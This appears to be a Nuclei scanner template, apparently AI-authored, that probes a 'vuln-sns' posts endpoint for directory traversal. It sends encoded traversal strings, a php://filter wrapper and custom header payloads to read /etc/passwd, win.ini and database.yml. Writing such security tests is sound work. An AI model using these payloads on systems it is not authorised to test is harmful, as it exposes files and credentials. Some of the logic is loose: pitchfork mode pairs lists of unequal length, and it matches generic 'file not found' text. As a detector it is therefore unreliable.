id: vuln-sns-posts-public-directory-traversal
info:
  name: Vuln SNS Posts Public - Directory Traversal
  author: claude
  severity: high
  description: |
    Tests for directory traversal vulnerabilities in the public posts endpoint.
    Hidden parameters might allow file system access through path manipulation.
  reference:
    - https://owasp.org/www-community/attacks/Path_Traversal
  tags: vuln-sns,lfi,traversal,posts

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/posts?{{param}}={{payload}}"

    payloads:
      param:
        - "file"
        - "path"
        - "template"
        - "include"
        - "page"
        - "load"
        - "read"
        - "source"
        - "doc"

      payload:
        - "../../../etc/passwd"
        - "..\\..\\..\\windows\\win.ini"
        - "....//....//....//etc/passwd"
        - "..%2F..%2F..%2Fetc%2Fpasswd"
        - "..%252f..%252f..%252fetc%252fpasswd"
        - "/etc/passwd"
        - "C:\\Windows\\win.ini"
        - "../../../../../../etc/passwd"
        - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        - "file:///etc/passwd"
        - "php://filter/convert.base64-encode/resource=/etc/passwd"

    attack: pitchfork
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "[fonts]"
          - "[extensions]"
          - "/bin/bash"
          - "/bin/sh"
        condition: or
        part: body

      - type: regex
        regex:
          - '(\/[a-zA-Z0-9]+)+:[0-9]+:[0-9]+'
          - '[a-zA-Z]:\\[a-zA-Z0-9\\.\\]+'
        condition: or
        part: body

      - type: word
        words:
          - "cannot find"
          - "no such file"
          - "file not found"
          - "path not found"
        condition: or
        part: body

    extractors:
      - type: regex
        name: file_content
        regex:
          - 'root:.*:0:0'
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/posts"

    headers:
      X-Include-File: "{{payload}}"
      X-Template: "{{payload}}"

    payloads:
      payload:
        - "../../../etc/passwd"
        - "../../config/database.yml"

    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "password:"
          - "database:"
        condition: or
        part: body